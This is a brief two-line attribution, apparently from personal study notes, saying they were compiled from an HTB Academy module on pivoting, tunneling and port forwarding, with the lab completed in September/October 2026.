*Notes compiled from HTB Academy — Pivoting, Tunneling & Port Forwarding module*
*Lab completed on: September/October 2026*
